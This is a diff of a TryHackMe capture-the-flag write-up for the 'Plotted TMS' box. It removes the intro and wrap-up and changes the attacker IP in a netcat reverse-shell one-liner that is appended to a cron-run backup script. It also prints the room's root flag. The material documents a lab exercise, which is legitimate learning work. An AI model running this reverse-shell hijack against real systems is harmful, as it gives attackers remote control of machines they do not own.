@@ -1,7 +1,5 @@
 # TryHackMe — Plotted TMS Writeup
 
-Back at it again with another TryHackMe box, this time it's called **Plotted TMS**. Web app rabbit holes, a mildly savage rickroll-adjacent trolling attempt from the box author, SQL injection, arbitrary file upload, a cron job we can hijack, and a doas misconfig to cap it all off. Let's get into it.
-
 ## Enumeration
 
 Kicked things off with the usual nmap scan:
@@ -166,7 +164,7 @@ www-data@plotted:/home/plot_admin$ ls -al /var/www/scripts/backup.sh
 The script itself is owned by `plot_admin` and I can't write to it directly as `www-data`. But the directory it lives in is a different story:
 
 ```
-www-data@plotted:/var/www/scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.200.85.243 1235 >/tmp/f" >> /var/www/scripts/test.sh
+www-data@plotted:/var/www/scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.140.36 1235 >/tmp/f" >> /var/www/scripts/test.sh
 www-data@plotted:/var/www/scripts$ rm backup.sh
 rm: remove write-protected regular file 'backup.sh'? y
 www-data@plotted:/var/www/scripts$ mv test.sh backup.sh
@@ -230,9 +228,5 @@ Do let me know if you have any ideas/suggestions for future rooms.
 Anddd we got root!
 
 **ROOT FLAG: 53f85e2da3e874426fa059040a9bdcab**
-
-## Wrap-up
-
-Fun little box — the base64-encoded troll files were a nice touch to keep people from wasting time on a fake SSH key, and the actual path was a clean chain: SQLi auth bypass → unrestricted file upload → cron job hijack via a writable directory → doas/openssl GTFOBins file read for root. Nothing overly exotic, but a solid end-to-end web-to-root exercise.
 
 Thanks for reading!
